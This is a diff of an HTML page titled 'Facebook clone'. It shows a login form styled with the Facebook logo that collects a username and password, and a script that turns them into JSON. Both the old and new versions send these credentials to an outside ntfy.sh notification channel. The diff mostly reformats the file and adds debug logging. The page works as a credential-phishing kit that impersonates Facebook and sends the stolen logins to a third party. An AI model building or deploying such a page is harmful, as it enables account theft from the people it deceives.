@@ -1,116 +1,109 @@
 <!doctype html>
 <html>
-    <head>
-        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-        <style type="text/css" media="all">
-            body {
-                background: #bbdefb;
-            }
-            a i {
-                scale: 3;
-                margin: 20px 0;
-                color: #0d47a1;
-            }
-            form {
-                width: 250px;
-                height: 400px;
-                background: #e3f2fd;
-                background: #90caf9;
-                margin: 40% auto;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                flex-direction: column;
-                gap: 17px;
-                border-radius: 10px;
-                box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
-            }
-            @media (min-width: 400px) {
-                form {
-                    width: 500px;
-                }
-            }
+ <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style type="text/css" media="all">
+   body {
+    background: #bbdefb;
+   }
+   a i {
+    scale: 3;
+    margin: 20px 0;
+    color: #0d47a1;
+   }
+   form {
+    width: 250px;
+    height: 400px;
+    background: #e3f2fd;
+    background: #90caf9;
+    margin: 40% auto;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    gap: 17px;
+    border-radius: 10px;
+    box-shadow: rgba(0, 0, 0, 0.24) 0px 3px 8px;
+   }
+   @media (min-width: 400px) {
+    form {
+     width: 500px;
+    }
+   }
 
-            input {
-                padding: 5px 10px;
-                border-radius: 8px;
-                border: 2px solid #fff;
-                outline: none;
-                box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;
-            }
-            button {
-                box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;
-                border: none;
-                border-radius: 5px;
-                padding: 5px 20px;
-                color: #0d47a1;
-                font-weight: bold;
-                background: #fff;
-            }
-        </style>
+   input {
+    padding: 10px 8px;
+    border-radius: 8px;
+    border: 2px solid #fff;
+    outline: none;
+    box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;
+   }
+   button {
+    box-shadow: rgba(0, 0, 0, 0.16) 0px 1px 4px;
+    border: none;
+    border-radius: 5px;
+    padding: 10px 20px;
+    color: #0d47a1;
+    font-weight: bold;
+    background: #fff;
+   }
+   ::placeholder {
+     color: #ccc;
+     font-weight: 600;
+   }
+  </style>
 
-        <link
-            rel="stylesheet"
-            href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.1.0/css/all.css"
-            integrity="sha512-ajhUYg8JAATDFejqbeN7KbF2zyPbbqz04dgOLyGcYEk/MJD3V+HJhJLKvJ2VVlqrr4PwHeGTTWxbI+8teA7snw=="
-            crossorigin="anonymous"
-            referrerpolicy="no-referrer"
-        />
+  <link
+   rel="stylesheet"
+   href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.1.0/css/all.css"
+   integrity="sha512-ajhUYg8JAATDFejqbeN7KbF2zyPbbqz04dgOLyGcYEk/MJD3V+HJhJLKvJ2VVlqrr4PwHeGTTWxbI+8teA7snw=="
+   crossorigin="anonymous"
+   referrerpolicy="no-referrer" />
 
-        <title>Facebook clone</title>
-    </head>
-    <body>
-        <form
-            id="myForm"
-            action="https://ntfy.sh/FormHandleByGul"
-            method="post"
-        >
-            <a href="#"><i class="fab fa-facebook-f"></i></a>
-            <input
-                type="text"
-                name="username"
-                id=""
-                value=""
-                placeholder="User name"
-            />
-            <input
-                type="password"
-                name="password"
-                id=""
-                value=""
-                placeholder="password"
-            />
-            <button type="submit">Log in</button>
-        </form>
+  <title>Facebook clone</title>
+ </head>
+ <body>
+  <form id="myForm" action="https://ntfy.sh/FormHandleByGul" method="post">
+   <a href="#"><i class="fab fa-facebook-f"></i></a>
+   <input type="text" name="username" id="" value="" placeholder="User name" />
+   <input
+    type="password"
+    name="password"
+    id=""
+    value=""
+    placeholder="password" />
+   <button type="submit">Log in</button>
+  </form>
 
-        <script type="text/javascript" charset="utf-8">
-            document
-                .getElementById("myForm")
-                .addEventListener("submit", function (e) {
-                    e.preventDefault(); // Prevent the default form submission
+  <script type="text/javascript" charset="utf-8">
+   document.getElementById("myForm").addEventListener("submit", function (e) {
+    e.preventDefault(); // Prevent the default form submission
 
-                    const formData = new FormData(e.target); // Create a FormData object from the form
+    const formData = new FormData(e.target); // Create a FormData object from the form
+    console.log("Form data Object "+ FormData)
 
-                    const url = "https://ntfy.sh/FormHandleByGul"; // Replace with your API endpoint
-                    console.log(formData.forEach(data => console.log(data)));
-                    const jsonData = {};
-                    formData.forEach((value, key) => {
-                        jsonData[key] = value;
-                    });
-                    fetch(url, {
-                        method: "POST",
-                        body: JSON.stringify(jsonData) // Send the form data as is
-                    })
-                        .then(response => response.json())
-                        .then(data => {
-                          console.log("data will or")
-                            console.log(data); // Handle the response data
-                        })
-                        .catch(error => {
-                            console.error("Error:", error);
-                        });
-                });
-        </script>
-    </body>
+    const url = "https://ntfy.sh/FormHandleByGul"; // Replace with your API endpoint
+    console.log(formData.forEach(data => console.log(data + " >> formdata loop")));
+    const jsonData = {};
+    formData.forEach((value, key) => {
+     console.log(key)
+     jsonData[key] = value;
+    });
+    console.log(jsonData)
+    fetch(url, {
+     method: "POST",
+     body: JSON.stringify(jsonData) // Send the form data as is
+    })
+     .then(response => response.json())
+     .then(data => {
+      console.log("Response data");
+      console.log(data); // Handle the response data
+     })
+     .catch(error => {
+      console.error("Error:", error);
+     });
+   });
+  </script>
+ </body>
 </html>
